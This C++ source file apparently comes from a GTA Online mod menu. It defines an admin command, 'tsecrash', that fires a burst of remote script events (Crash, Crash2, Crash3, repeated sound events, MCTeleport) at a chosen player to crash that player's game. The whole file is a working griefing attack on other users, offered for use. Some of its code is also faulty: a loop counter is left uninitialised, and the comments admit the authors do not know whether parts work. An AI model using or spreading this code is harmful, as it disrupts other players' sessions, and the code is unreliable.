#ifdef ENABLE_CRASHES
#include "backend/player_command.hpp"
#include "pointers.hpp"
#include "util/math.hpp"
#include "core/enums.hpp"

#include <cstdint>

namespace big
{
	class tsecrash : player_command
	{
		using player_command::player_command;

		virtual CommandAccessLevel get_access_level() override
		{
			return CommandAccessLevel::ADMIN;
		}

		virtual void execute(player_ptr player, const command_arguments& _args, const std::shared_ptr<command_context> ctx) override
		{
			int64_t args1[] = { (int64_t)eRemoteEvent::Crash, (int64_t)self::id };
			g_pointers->m_gta.m_trigger_script_event(1, args1, sizeof(args1) / sizeof(args1[0]), 1 << player->id(), (int)eRemoteEvent::Crash);

			int64_t args2[] = { (int64_t)eRemoteEvent::Crash2, (int64_t)self::id, math::rand(256, INT32_MAX) };
			g_pointers->m_gta.m_trigger_script_event(1, args2, sizeof(args2) / sizeof(args2[0]), 1 << player->id(), (int)eRemoteEvent::Crash2);

			int64_t args3[] = { (int64_t)eRemoteEvent::Crash3, (int64_t)self::id, -4640169, (int64_t)NAN, (int64_t)NAN, (int64_t)NAN, -36565476, -53105203}; // No idea if it works or not.
			g_pointers->m_gta.m_trigger_script_event(1, args3, sizeof(args3) / sizeof(args3[0]), 1 << player->id(), (int)eRemoteEvent::Crash3);

			for(int i; i < 32; i++)
			{
				int64_t args5[] = { (int64_t)eRemoteEvent::TSECommand, (int64_t)self::id, (int)eRemoteEvent::TSECommandSound, math::rand(9999) }; // No idea if it works or not.
				g_pointers->m_gta.m_trigger_script_event(1, args5, sizeof(args5) / sizeof(args5[0]), 1 << player->id(), (int)eRemoteEvent::Crash3);
			}

			int64_t args6[] = { (int64_t)eRemoteEvent::MCTeleport, (int64_t)self::id, rand() % INT32_MAX, rand() % INT32_MAX };
			g_pointers->m_gta.m_trigger_script_event(1, args6, sizeof(args6) / sizeof(args6[0]), 1 << player->id(), (int)eRemoteEvent::MCTeleport);
		}
	};

	tsecrash g_tsecrash("tsecrash", "TSE Crash", "Sends crash script events.", 0);
}
#endif // ENABLE_CRASHES